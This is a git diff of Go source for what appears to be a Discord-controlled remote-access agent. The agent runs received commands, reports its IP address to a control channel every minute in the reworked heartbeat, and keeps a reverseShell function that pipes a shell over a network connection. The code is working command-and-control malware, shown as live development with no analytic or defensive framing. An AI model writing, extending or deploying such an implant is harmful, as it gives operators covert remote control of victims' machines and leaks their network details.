@@ -9,7 +9,6 @@ import (
 	"os/exec"
 	"os/signal"
 	"runtime"
-	"strconv"
 	"strings"
 	"syscall"
 	"time"
@@ -100,6 +99,16 @@ func main() {
 		dg.AddHandler(messageCreator)
 	}
 
+	go func(dg *discordgo.Session) {
+		ticker := time.NewTicker(time.Duration(1) * time.Minute)
+		for {
+			<-ticker.C
+			go heartBeat(dg)
+			ticker.Reset((time.Duration(1) * time.Minute))
+
+		}
+	}(dg)
+
 	// Open a websocket connection to Discord and begin listening.
 	err = dg.Open()
 	if err != nil {
@@ -112,7 +121,7 @@ func main() {
 	}
 	// Wait here until CTRL-C or other term signal is received.
 	sc := make(chan os.Signal, 1)
-	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
+	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
 	<-sc
 
 	lastMessage := "[-] Agent " + newAgent.UUID + " has disconnected"
@@ -181,19 +190,8 @@ func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
 }
 
 func heartBeat(dg *discordgo.Session) {
-	// fmt.Println("1 minute")
-	// sendLMessage := message.NewMessage(newAgent.UUID, "", false, false, message.MESSAGE_HEARTBEAT)
-	// dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
-
-	// ping the server every minute
-	pulseDelay := time.Duration(60)
-	tick := time.NewTicker(time.Second * pulseDelay)
-	// go heartbeat(dg, tick)
-	for t := range tick.C {
-		// fmt.Printf("%v:%v\n", t.Minute(), t.Second())
-		sendLMessage := message.NewMessage(newAgent.UUID, strconv.Itoa(t.Minute())+":"+strconv.Itoa(t.Second()), false, false, message.MESSAGE_HEARTBEAT)
-		dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
-	}
+	newMessage := message.NewMessage(newAgent.UUID, fmt.Sprintf("!heartbeat %v", newAgent.IP), false, false, message.MESSAGE_HEARTBEAT)
+	dg.ChannelMessageSend(constants.ChannelID, newMessage)
 }
 
 func executeCommand(command string) string {
@@ -269,19 +267,6 @@ func reverseShell(host string) {
 	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
 	sh.Run()
 	conn.Close()
-}
-
-func heartbeat(dg *discordgo.Session, tick *time.Ticker) {
-	for t := range tick.C {
-		pingTheServer(dg, t)
-	}
-}
-
-// Attempt to ping the server to let them know we are still alive and kicking. This will (in theory) remain persistent even if the server resets etc
-func pingTheServer(dg *discordgo.Session, tick time.Time) {
-	fmt.Println("1 minute")
-	newMessage := message.NewMessage(newAgent.UUID, "Ping at "+tick.String(), false, false, message.MESSAGE_PING)
-	dg.ChannelMessageSend(constants.ChannelID, newMessage)
 }
 
 func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
